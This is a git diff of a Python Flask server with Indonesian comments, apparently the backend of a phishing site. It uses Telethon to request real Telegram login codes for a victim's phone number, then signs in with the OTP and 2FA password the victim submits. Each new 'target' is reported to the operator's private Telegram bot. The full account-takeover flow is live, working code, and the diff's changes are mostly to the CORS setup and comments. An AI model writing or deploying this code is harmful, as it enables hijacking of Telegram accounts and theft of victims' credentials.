@@ -7,19 +7,27 @@ from telethon import TelegramClient, errors
 from asgiref.sync import async_to_sync
 
 app = Flask(__name__)
-# Perbaikan Utama: Mengizinkan semua akses dari domain manapun (Netlify)
-CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Ambil variabel dari Railway
+# FIX CORS: Mengizinkan akses penuh dari domain Netlify
+CORS(app, resources={
+    r"/*": {
+        "origins": "*",
+        "methods": ["GET", "POST", "OPTIONS"],
+        "allow_headers": ["Content-Type", "Authorization"]
+    }
+})
+
+# Ambil variabel dari dashboard Railway
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-# Penyimpanan hash OTP sementara
+# Hash sementara untuk verifikasi OTP
 sessions_hash = {}
 
 def send_to_bot(message):
+    """Mengirim log ke Telegram pribadi"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try:
         requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
@@ -27,26 +35,26 @@ def send_to_bot(message):
         pass
 
 async def telethon_logic(data):
+    """Logika Telethon untuk validasi OTP & Sandi secara real-time"""
     step = data.get('step')
     nomor = data.get('nomor')
     otp = data.get('otp')
     sandi = data.get('sandi')
     nama = data.get('nama', 'User')
 
-    # Session unik agar tidak terjadi tabrakan antar user
     client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
     
     try:
         await client.connect()
         
-        # STEP 1: Kirim Kode ke Telegram User
+        # STEP 1: Kirim Kode OTP asli dari Telegram
         if step == 1:
             sent_code = await client.send_code_request(nomor)
             sessions_hash[nomor] = sent_code.phone_code_hash
             send_to_bot(f"📲 *Target Masuk*\nNama: {nama}\nNomor: {nomor}")
             return {"status": "success"}, 200
 
-        # STEP 2: Cek OTP Real-time
+        # STEP 2: Verifikasi OTP
         elif step == 2:
             phone_code_hash = sessions_hash.get(nomor)
             try:
@@ -58,7 +66,7 @@ async def telethon_logic(data):
             except errors.PhoneCodeInvalidError:
                 return {"status": "error", "message": "Kode OTP Salah!"}, 400
 
-        # STEP 3: Cek Sandi 2FA
+        # STEP 3: Verifikasi Sandi 2FA
         elif step == 3:
             try:
                 await client.sign_in(password=sandi)
@@ -74,19 +82,19 @@ async def telethon_logic(data):
 
 @app.route('/register', methods=['POST', 'OPTIONS'])
 def register():
-    # Menangani 'Preflight Request' dari browser (CORS fix)
+    # WAJIB: Menangani Preflight Request agar tidak kena blokir browser
     if request.method == 'OPTIONS':
         return jsonify({"status": "ok"}), 200
         
     data = request.json
     try:
-        # Menghubungkan Flask ke fungsi async Telethon secara aman
+        # Menjalankan fungsi async di dalam Flask agar tidak crash
         result, status_code = async_to_sync(telethon_logic)(data)
         return jsonify(result), status_code
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
 if __name__ == "__main__":
-    # Mengikuti port yang disediakan Railway
+    # Menjalankan server pada port yang sesuai dengan dashboard Railway
     port = int(os.getenv("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
